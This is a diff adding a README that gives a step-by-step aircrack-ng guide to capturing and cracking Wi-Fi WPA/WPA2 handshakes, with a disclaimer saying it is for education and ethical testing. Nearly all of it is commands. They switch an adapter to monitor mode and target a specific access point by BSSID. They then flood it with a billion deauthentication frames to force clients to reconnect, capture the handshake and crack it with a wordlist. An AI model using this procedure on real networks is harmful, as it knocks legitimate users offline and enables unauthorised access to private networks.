@@ -1,0 +1,46 @@
+# 🔐 Wi-Fi Handshake Capture & Cracking Guide (Aircrack-ng)
+
+> ⚠️ **For Educational & Ethical Hacking Purposes Only**  
+> Do not use this on networks you don’t own or have explicit permission to test.
+
+## 🛠️ Tools Required
+- A compatible Wi-Fi adapter (monitor mode + packet injection)
+- aircrack-ng suite (`sudo apt install aircrack-ng` on Debian-based systems)
+
+---
+
+## 📜 Step-by-Step Commands
+
+```bash
+# 1. Check wireless interfaces
+iwconfig
+
+# 2. Enable monitor mode on wlan0
+sudo airmon-ng start wlan0  
+
+# 3. Confirm monitor mode (should show wlan0mon)
+iwconfig 
+
+# 4. Scan nearby networks
+sudo airodump-ng wlan0mon 
+
+# 5. Target specific network (run in background)
+sudo airodump-ng --bssid A8:6E:84:73:8F:26 --channel 4 wlan0mon &
+
+# 6. Force deauthentication to trigger handshake
+sudo aireplay-ng --deauth 1000000000 -a A8:6E:84:73:8F:26 wlan0mon
+
+# 7. Capture the WPA/WPA2 handshake
+sudo airodump-ng --bssid A8:6E:84:73:8F:26 --channel 4 --write handshake1 wlan0mon &
+
+# 8. (Optional) Trigger more deauths if needed
+sudo aireplay-ng --deauth 1000000000 -a A8:6E:84:73:8F:26 wlan0mon
+
+# 9. Crack the handshake using a wordlist
+sudo aircrack-ng handshake1-01.cap -w test.txt
+
+# 10. Stop monitor mode & restore interface
+sudo airmon-ng stop wlan0mon
+
+
+
